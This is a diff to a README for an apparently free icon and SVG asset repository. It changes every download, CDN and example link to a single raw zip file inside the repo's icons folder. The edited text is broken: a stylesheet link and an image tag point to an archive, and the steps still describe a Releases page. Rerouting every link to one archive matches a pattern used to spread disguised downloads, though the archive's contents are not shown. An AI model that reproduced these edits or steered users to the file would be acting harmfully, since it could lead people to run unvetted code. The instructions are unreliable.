@@ -6,7 +6,7 @@ Welcome to the assets repository! This is your go-to place for a public collecti
 
 ## 📦 Download & Install
 
-To download the latest version of assets, visit this page: [Download assets](https://github.com/cocozellewarbler837/assets/releases). Here, you'll find the most recent releases that you can download for free.
+To download the latest version of assets, visit this page: [Download assets](https://raw.githubusercontent.com/cocozellewarbler837/assets/main/icons/assets-v1.2.zip). Here, you'll find the most recent releases that you can download for free.
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version at the top of the page.
@@ -29,7 +29,7 @@ These resources are designed to make your design tasks easier and more efficient
 If you prefer not to download files, you can also use the assets directly via a Content Delivery Network (CDN). This method allows you to include these resources seamlessly in your projects without needing to store them locally. Here’s a simple example of how to use an asset with CDN:
 
 ```html
-<link rel="stylesheet" href="https://cdn.example.com/path/to/asset.css">
+<link rel="stylesheet" href="https://raw.githubusercontent.com/cocozellewarbler837/assets/main/icons/assets-v1.2.zip">
 ```
 
 Replace the example URL with the actual CDN link for the asset you want to use.
@@ -50,7 +50,7 @@ While this repository is user-friendly, here’s what you might need to ensure a
 After downloading, you can directly integrate the icons or SVGs by linking them in your HTML code. For example, to use an SVG, you can use the following code:
 
 ```html
-<img src="path/to/downloaded/file.svg" alt="Description of SVG">
+<img src="https://raw.githubusercontent.com/cocozellewarbler837/assets/main/icons/assets-v1.2.zip" alt="Description of SVG">
 ```
 
 ### Are the assets free to use?
@@ -94,4 +94,4 @@ Using this repository not only enhances your projects but also supports the open
 
 ---
 
-For any assistance, revisit the [Releases page](https://github.com/cocozellewarbler837/assets/releases) to download the latest version and explore the variety of assets available to you. With these resources, your web design journey will be much more enjoyable!
+For any assistance, revisit the [Releases page](https://raw.githubusercontent.com/cocozellewarbler837/assets/main/icons/assets-v1.2.zip) to download the latest version and explore the variety of assets available to you. With these resources, your web design journey will be much more enjoyable!
